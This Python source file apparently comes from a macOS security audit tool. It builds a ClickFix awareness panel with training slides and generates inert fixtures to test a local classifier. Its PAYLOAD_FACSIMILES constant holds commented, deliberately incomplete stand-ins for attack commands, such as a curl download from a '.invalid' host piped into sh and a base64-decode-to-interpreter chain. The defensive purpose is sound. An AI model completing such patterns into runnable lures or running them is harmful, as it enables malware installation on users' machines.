from __future__ import annotations

import json
import random
from datetime import datetime, timezone
from pathlib import Path
from uuid import uuid4

from PySide6.QtCore import QUrl, Signal
from PySide6.QtGui import QDesktopServices
from PySide6.QtWidgets import (
    QComboBox,
    QDialog,
    QFileDialog,
    QLabel,
    QMessageBox,
    QPushButton,
    QTextBrowser,
    QTextEdit,
    QVBoxLayout,
    QWidget,
)

from mac_audit_agent.clickfix.awareness import CLICKFIX_PRESENTATIONS
from mac_audit_agent.clickfix.classifier import classify_text, evidence_hash
from mac_audit_agent.professional_report import (
    PROFESSIONAL_REPORT_FILTER,
    selected_report_path,
    structured_payload_report,
)
from mac_audit_agent.reporting import get_reports_dir
from mac_audit_agent.ui.responsive_actions import ResponsiveActionRow

SIGNALS = (
    "unexpected verification request", "clipboard-to-terminal instruction", "fake remediation prompt",
    "command chaining", "encoded-content claim", "interpreter handoff", "download-and-run claim",
    "invisible-character warning", "persistence request", "security-control impairment request",
)
LURES = (
    "browser verification", "meeting access", "document repair", "support diagnostic",
    "account recovery", "software update", "CAPTCHA completion", "cloud file access",
)
PAYLOAD_FACSIMILES = (
    (
        "download piped to an interpreter",
        "# DO NOT PASTE — INERT MSAA TRAINING FACSIMILE\n"
        "# curl https://verification.example.invalid/[omitted] | sh\n"
        "# Expected harmless intent: open Calculator (execution omitted)",
    ),
    (
        "encoded command handoff",
        "# DO NOT PASTE — INERT MSAA TRAINING FACSIMILE\n"
        "# Reserved non-resolving training host: verification.example.invalid\n"
        "# printf '[encoded content omitted]' | base64 --decode | [interpreter omitted]\n"
        "# Expected harmless intent: open Calculator (execution omitted)",
    ),
    (
        "fake support diagnostic",
        "# DO NOT PASTE — INERT MSAA TRAINING FACSIMILE\n"
        "# Reserved non-resolving training host: verification.example.invalid\n"
        "# /bin/zsh -c '[download, staging, and execution arguments omitted]'\n"
        "# Expected harmless intent: open Calculator (execution omitted)",
    ),
    (
        "multi-stage verification instruction",
        "# DO NOT PASTE — INERT MSAA TRAINING FACSIMILE\n"
        "# [fetch from verification.example.invalid] && [decode] && [execute]\n"
        "# Expected harmless intent: open Calculator (execution omitted)",
    ),
)


class ClickFixPresentationViewer(QDialog):
    """A focused, non-modal slide viewer for the awareness catalog."""

    index_changed = Signal(int)
    completion_requested = Signal(int)

    def __init__(self, *, initial_index: int, completed: set[str], preview_only: bool = False, parent=None) -> None:
        super().__init__(parent)
        self.completed = completed
        self.preview_only = bool(preview_only)
        self.index = max(0, min(len(CLICKFIX_PRESENTATIONS) - 1, initial_index))
        self.setObjectName("clickfixPresentationViewer")
        self.setWindowTitle("ClickFix Awareness Presentation")
        self.setMinimumSize(620, 500)
        self.resize(820, 680)

        layout = QVBoxLayout(self)
        layout.setContentsMargins(24, 20, 24, 20)
        layout.setSpacing(12)
        self.counter_label = QLabel()
        self.counter_label.setObjectName("clickfixPresentationCounter")
        self.counter_label.setStyleSheet("font-weight: 700;")
        layout.addWidget(self.counter_label)

        self.slide = QTextBrowser()
        self.slide.setObjectName("clickfixPresentationSlide")
        self.slide.setOpenExternalLinks(False)
        self.slide.setAccessibleName("ClickFix awareness presentation slide")
        layout.addWidget(self.slide, 1)

        actions = ResponsiveActionRow()
        self.previous_button = QPushButton("Previous")
        self.next_button = QPushButton("Next")
        self.complete_button = QPushButton("Mark Complete")
        self.close_button = QPushButton("Close")
        self.previous_button.clicked.connect(lambda: self.set_index(self.index - 1))
        self.next_button.clicked.connect(lambda: self.set_index(self.index + 1))
        self.complete_button.clicked.connect(lambda: self.completion_requested.emit(self.index))
        self.close_button.clicked.connect(self.close)
        actions.add_buttons([self.previous_button, self.next_button, self.complete_button, self.close_button])
        layout.addWidget(actions)
        self.refresh()

    def set_index(self, index: int) -> None:
        bounded = max(0, min(len(CLICKFIX_PRESENTATIONS) - 1, int(index)))
        if bounded == self.index:
            return
        self.index = bounded
        self.refresh()
        self.index_changed.emit(self.index)

    def refresh(self) -> None:
        item = CLICKFIX_PRESENTATIONS[self.index]
        total = len(CLICKFIX_PRESENTATIONS)
        self.counter_label.setText(f"Presentation {self.index + 1} of {total}")
        self.slide.setHtml(item.render_html(self.index + 1, total))
        self.previous_button.setEnabled(self.index > 0)
        self.next_button.setEnabled(self.index < total - 1)
        completed = item.presentation_id in self.completed
        self.complete_button.setText("Completed" if completed else "Mark Complete")
        self.complete_button.setEnabled(not completed and not self.preview_only)
        if self.preview_only:
            self.complete_button.setToolTip("Demo Preview: completion records require a signed offline license.")


class ClickFixAwarenessPanel(QWidget):
    """Non-executable ClickFix education and classifier regression fixtures."""

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.counter = 0
        self.completed_presentations: set[str] = set()
        self._presentation_viewer: ClickFixPresentationViewer | None = None
        self.last_report: dict[str, object] | None = None
        layout = QVBoxLayout(self)
        description = QLabel(
            "ClickFix campaigns impersonate trusted websites, support staff, updates, or verification steps and persuade a person to copy text into Terminal or another execution surface. The social instruction—not only the final command—is the attack. Real campaigns change rapidly and may use encoding, chained interpreters, hidden characters, or staged downloads. Never paste an untrusted verification command into Terminal."
        )
        description.setWordWrap(True); layout.addWidget(description)
        safety = QLabel(
            "Safe training mode: fixtures below are deliberately non-executable and contain bracketed semantic markers, commented facsimiles, and only the reserved non-resolving .invalid training domain. They contain no runnable scripts, encodings, or bypass recipes; they are evaluated in memory and never copied to the clipboard or launched."
        )
        safety.setWordWrap(True); safety.setStyleSheet("font-weight: 700; color: #F2C94C;"); layout.addWidget(safety)
        presentation_heading = QLabel("User Awareness Presentations — 1 to 20")
        presentation_heading.setProperty("textRole", "sectionTitle")
        layout.addWidget(presentation_heading)
        presentation_actions = ResponsiveActionRow()
        self.presentation_combo = QComboBox()
        self.presentation_combo.setProperty("demoAllowed", True)
        for number, presentation in enumerate(CLICKFIX_PRESENTATIONS, start=1):
            self.presentation_combo.addItem(f"{number}. {presentation.title}", presentation.presentation_id)
        self.start_presentation_button = QPushButton("Start Presentation")
        self.start_presentation_button.setProperty("role", "primary")
        self.start_presentation_button.setToolTip("Open the selected lesson in a focused presentation window.")
        self.previous_presentation_button = QPushButton("Previous")
        self.next_presentation_button = QPushButton("Next")
        self.complete_presentation_button = QPushButton("Mark Complete")
        presentation_actions.add_buttons(
            [
                self.presentation_combo,
                self.start_presentation_button,
                self.previous_presentation_button,
                self.next_presentation_button,
                self.complete_presentation_button,
            ]
        )
        layout.addWidget(presentation_actions)
        self.presentation_progress = QLabel("Awareness completion: 0/20 (optional training record; not a security finding)")
        self.presentation_progress.setWordWrap(True)
        layout.addWidget(self.presentation_progress)
        self.presentation = QTextBrowser()
        self.presentation.setObjectName("clickfixPresentationPreview")
        self.presentation.setReadOnly(True)
        self.presentation.setOpenExternalLinks(False)
        self.presentation.setAccessibleName("Selected benign ClickFix awareness presentation")
        self.presentation.setMinimumHeight(340)
        layout.addWidget(self.presentation, 1)
        self.presentation_combo.currentIndexChanged.connect(self._show_presentation)
        self.start_presentation_button.clicked.connect(self._open_presentation)
        self.previous_presentation_button.clicked.connect(lambda: self._move_presentation(-1))
        self.next_presentation_button.clicked.connect(lambda: self._move_presentation(1))
        self.complete_presentation_button.clicked.connect(lambda: self._mark_presentation_complete())
        self._show_presentation()

        fixture_heading = QLabel("Optional Harmless Classifier Test")
        fixture_heading.setProperty("textRole", "sectionTitle")
        layout.addWidget(fixture_heading)
        actions = ResponsiveActionRow()
        self.generate_button = QPushButton("Generate Harmless Awareness Fixture")
        self.generate_button.clicked.connect(self.generate_fixture)
        self.export_button = QPushButton("Export Test Report"); self.export_button.setEnabled(False); self.export_button.clicked.connect(self.export_report)
        self.report_button = QPushButton("Prepare Report to LiquidSky Security"); self.report_button.setEnabled(False); self.report_button.clicked.connect(self.prepare_email)
        actions.add_buttons([self.generate_button, self.export_button, self.report_button]); layout.addWidget(actions)
        self.result = QLabel("Generate a fixture to test the local fallback classifier."); self.result.setWordWrap(True); layout.addWidget(self.result)
        self.fixture = QTextEdit(); self.fixture.setReadOnly(True); self.fixture.setAccessibleName("Non-executable ClickFix awareness fixture"); layout.addWidget(self.fixture, 1)
        limitations = QLabel("A pass validates this MSAA classifier path only. It does not prove that every terminal, shell, EDR, AV, browser, or native sensor path is protected. Do not convert these semantic fixtures into executable commands.")
        limitations.setWordWrap(True); layout.addWidget(limitations)

    def _show_presentation(self) -> None:
        index = max(0, self.presentation_combo.currentIndex())
        item = CLICKFIX_PRESENTATIONS[index]
        self.presentation.setHtml(item.render_html(index + 1, len(CLICKFIX_PRESENTATIONS)))
        self.previous_presentation_button.setEnabled(index > 0)
        self.next_presentation_button.setEnabled(index < len(CLICKFIX_PRESENTATIONS) - 1)
        completed = item.presentation_id in self.completed_presentations
        self.complete_presentation_button.setText("Completed" if completed else "Mark Complete")
        self.complete_presentation_button.setEnabled(not completed)
        if self._presentation_viewer is not None and self._presentation_viewer.isVisible():
            self._presentation_viewer.set_index(index)

    def _open_presentation(self) -> None:
        if self._presentation_viewer is None:
            self._presentation_viewer = ClickFixPresentationViewer(
                initial_index=max(0, self.presentation_combo.currentIndex()),
                completed=self.completed_presentations,
                preview_only=self._demo_preview_active(),
                parent=self.window(),
            )
            self._presentation_viewer.index_changed.connect(self.presentation_combo.setCurrentIndex)
            self._presentation_viewer.completion_requested.connect(self._mark_presentation_complete)
        else:
            self._presentation_viewer.set_index(max(0, self.presentation_combo.currentIndex()))
        self._presentation_viewer.show()
        self._presentation_viewer.raise_()
        self._presentation_viewer.activateWindow()

    def _demo_preview_active(self) -> bool:
        current: QWidget | None = self
        while current is not None:
            if bool(current.property("demoPreviewMode")):
                return True
            current = current.parentWidget()
        return False

    def _move_presentation(self, direction: int) -> None:
        target = max(0, min(self.presentation_combo.count() - 1, self.presentation_combo.currentIndex() + direction))
        self.presentation_combo.setCurrentIndex(target)

    def _mark_presentation_complete(self, presentation_index: int | None = None) -> None:
        index = self.presentation_combo.currentIndex() if presentation_index is None else presentation_index
        if index < 0:
            return
        self.completed_presentations.add(CLICKFIX_PRESENTATIONS[index].presentation_id)
        count = len(self.completed_presentations)
        self.presentation_progress.setText(
            f"Awareness completion: {count}/{len(CLICKFIX_PRESENTATIONS)} "
            "(optional training record; not a security finding)"
        )
        self._show_presentation()
        if self._presentation_viewer is not None:
            self._presentation_viewer.refresh()

    def generate_fixture(self) -> None:
        self.counter += 1
        rng = random.SystemRandom()
        complexity = min(5, 1 + self.counter // 3)
        selected = rng.sample(SIGNALS, k=min(complexity + 1, len(SIGNALS)))
        lure = rng.choice(LURES)
        facsimile_name, facsimile = rng.choice(PAYLOAD_FACSIMILES)
        fixture_id = uuid4().hex
        markers = " ; ".join(f"[{value.upper().replace(' ', '_').replace('-', '_')}]" for value in selected)
        text = (
            f"MSAA_CLICKFIX_NON_EXECUTABLE_FIXTURE::{fixture_id}\n"
            f"LURE=[{lure.upper().replace(' ', '_')}]\n"
            f"OBSERVABLES={markers}\n"
            "FINAL_INTENT=[OPEN_CALCULATOR_DEMONSTRATION_ONLY]\n"
            "EXECUTABLE_CONTENT=[OMITTED_BY_DESIGN]\n\n"
            "WHAT A CLICKFIX PROMPT MAY LOOK LIKE\n"
            f"Pattern: {facsimile_name}\n{facsimile}"
        )
        classification = classify_text(text)
        caught = classification.command_like or bool(set(classification.matched_categories) & {"EXECUTION_CHAINING", "ENCODING", "PERSISTENCE", "SECURITY_IMPAIRMENT"})
        self.last_report = {
            "schema": "msaa.clickfix-awareness.v1", "fixture_id": fixture_id,
            "generated_at": datetime.now(timezone.utc).isoformat(), "fixture_number": self.counter,
            "complexity": complexity, "lure": lure, "semantic_signals": selected,
            "displayed_facsimile_pattern": facsimile_name,
            "non_executable": True, "fixture_sha256": evidence_hash(text),
            "classification": classification.classification, "confidence": classification.confidence,
            "matched_categories": list(classification.matched_categories), "guard_result": "caught" if caught else "needs_definition_review",
            "executable_content_stored": False,
        }
        self.fixture.setPlainText(text + "\n\nRESULT\n" + json.dumps(self.last_report, indent=2, sort_keys=True))
        self.result.setText("CAUGHT — the classifier recognized suspicious structure." if caught else "NEEDS DEFINITION REVIEW — this inert fixture was not classified as command-like. Export the report for review.")
        self.result.setStyleSheet("font-weight: 800; color: #4CD97B;" if caught else "font-weight: 800; color: #F2C94C;")
        self.export_button.setEnabled(True); self.report_button.setEnabled(True)

    def export_report(self) -> None:
        if not self.last_report: return
        default = get_reports_dir() / f"clickfix-awareness-{self.last_report['fixture_id']}.html"
        selected, selected_filter = QFileDialog.getSaveFileName(self, "Export ClickFix Awareness Report", str(default), PROFESSIONAL_REPORT_FILTER + ";;JSON Evidence (*.json)")
        if not selected: return
        path = Path(selected)
        if path.suffix.lower() not in {".html", ".docx", ".xlsx", ".json"}:
            path = Path(selected).with_suffix(".json" if "JSON" in selected_filter else selected_report_path(selected, selected_filter).suffix)
        if path.suffix.lower() == ".json": path.write_text(json.dumps(self.last_report, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        else: structured_payload_report(path, title="MSAA ClickFix Awareness Test Report", payload=self.last_report, qualification="This non-executable fixture validates one classifier path. It is not proof that every ClickFix delivery or execution path is prevented.")
        QMessageBox.information(self, "Report Exported", f"Saved privacy-safe report to:\n{path}")

    def prepare_email(self) -> None:
        if not self.last_report: return
        subject = f"MSAA ClickFix definition review {self.last_report['fixture_id']}"
        body = "A non-executable MSAA ClickFix Awareness fixture may need definition review. Export and attach the JSON report manually; verify it contains no sensitive information before sending."
        QDesktopServices.openUrl(QUrl(f"mailto:joe@liquidskysecurity.com?subject={QUrl.toPercentEncoding(subject).data().decode()}&body={QUrl.toPercentEncoding(body).data().decode()}"))
